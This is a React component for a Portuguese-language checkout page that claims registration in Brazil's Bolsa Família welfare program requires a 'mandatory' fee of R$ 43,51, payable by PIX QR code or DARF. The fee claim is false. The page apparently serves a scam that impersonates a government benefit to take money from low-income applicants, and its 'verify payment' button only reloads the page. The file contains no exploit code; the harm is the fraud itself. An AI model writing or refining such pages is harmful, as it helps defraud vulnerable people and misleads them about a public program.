import React, { useEffect } from 'react';
import { motion } from 'framer-motion';
import { FileText, RefreshCw } from 'lucide-react';
import { Header } from './Header';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';

interface PixScreenProps {
  onBack?: () => void;
  onDarf: () => void;
}

export const PixScreen: React.FC<PixScreenProps> = ({ onDarf }) => {
  useEffect(() => {
    // Garantir que o container esteja disponível para o script da Mangofy
    const container = document.getElementById('pix-checkout-container');
    if (container) {
      console.log('Container PIX disponível para Mangofy');
    }
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      <Header />
      
      <div className="bg-green-600 text-white p-4 shadow-lg mt-16">
        <div className="container mx-auto flex items-center justify-center space-x-4">
          <div className="text-center">
            <h1 className="text-xl font-bold">Pagamento da Taxa de Cadastro – Cadastro Bolsa Família</h1>
            <p className="text-green-100 mt-2">Para concluir seu cadastro e ter acesso ao benefício é necessário efetuar o pagamento da taxa única de R$ 43,51.</p>
          </div>
        </div>
      </div>

      <motion.div 
        className="flex items-center justify-center min-h-[calc(100vh-120px)] py-8"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="w-full max-w-4xl mx-4 space-y-6">
          <Card className="bg-white rounded-lg shadow-lg">
            <CardContent className="p-8">
              <div className="text-center space-y-4">
                <div className="space-y-3">
                  <p className="text-gray-700">
                    A taxa de R$ 43,51 corresponde a uma contribuição social obrigatória para a manutenção e processamento administrativo do cadastro no Programa Bolsa Família.
                  </p>
                  <p className="text-gray-700">
                    O pagamento deve ser feito por PIX ou via DARF gerado automaticamente.
                  </p>
                  <p className="text-gray-700">
                    Após o pagamento, o cadastro será confirmado e liberado.
                  </p>
                </div>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4 mt-6">
                  <div className="text-3xl font-bold text-green-600">
                    R$ 43,51
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Container para QR Code da Mangofy - SEMPRE presente no DOM */}
          <div className="flex justify-center">
            <div 
              id="pix-checkout-container" 
              className="w-full min-h-[350px] bg-white border border-gray-200 rounded-lg shadow-lg p-6"
            >
              {/* O script da Mangofy vai injetar o conteúdo aqui automaticamente */}
            </div>
          </div>

          <div className="flex flex-col sm:flex-row gap-4 justify-center pt-6">
            <Button 
              onClick={onDarf}
              className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg shadow-lg"
            >
              <FileText className="mr-2" size={20} />
              Gerar DARF
            </Button>
            <Button 
              onClick={() => window.location.reload()}
              className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg shadow-lg"
            >
              <RefreshCw className="mr-2" size={20} />
              Verificar Pagamento
            </Button>
          </div>
        </div>
      </motion.div>
    </div>
  );
};